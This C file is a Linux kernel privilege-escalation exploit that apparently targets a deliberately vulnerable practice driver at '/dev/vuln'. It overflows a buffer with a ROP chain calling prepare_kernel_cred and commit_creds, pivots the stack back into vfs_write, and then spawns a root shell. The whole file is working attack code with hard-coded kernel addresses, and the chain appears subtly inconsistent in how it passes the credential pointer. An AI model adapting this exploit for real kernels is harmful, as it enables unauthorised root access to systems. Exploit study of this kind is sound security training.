#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#define _GNU_SOURCE

uint64_t prepare_kernel_cred = 0xffffffff810918e0ULL;
uint64_t commit_creds = 0xffffffff81091630ULL;
uint64_t pop_rdi = 0xffffffff81300f2dULL; // pop rdi; ret;
uint64_t pop_rsp = 0xffffffff81029210ULL; // pop rsp ; ret

int opend_;
void open_device_state() {
  opend_ = open("/dev/vuln", O_RDWR);
  if (opend_ < 0) {
    printf("[-] unable to open device\n");
  } else {
    printf("[+] device opened\n");
  }
}

void smash() {
  uint64_t payload[10];
  payload[0] = 0x4141414141414141ULL;
  payload[1] = 0x4241414141414141ULL;
  payload[2] = 0x4341414141414141ULL;
  payload[3] = 0x4441414141414141ULL;
  payload[4] = pop_rdi; // pop rdi; ret;
  payload[5] = 0x0;
  payload[6] = prepare_kernel_cred;
  payload[7] = commit_creds;
  payload[8] = pop_rsp;               // pop rsp; ret;
  payload[9] = 0xffffc900001bff08ULL; // RSP -> vfs_write(), which is right
                                      // after vulnerable vuln_write()
  write(opend_, payload, sizeof(payload));
}

int main() {
  open_device_state();
  smash();
  setreuid(0, 0);
  if (getuid() == 0) {
    printf("[+] the flow is defeated!\n");
    char *argvsh[] = {"/bin/sh", NULL};
    execve("/bin/sh", argvsh, 0);
  } else {
    printf("[?] something went wrong\n");
  }
}
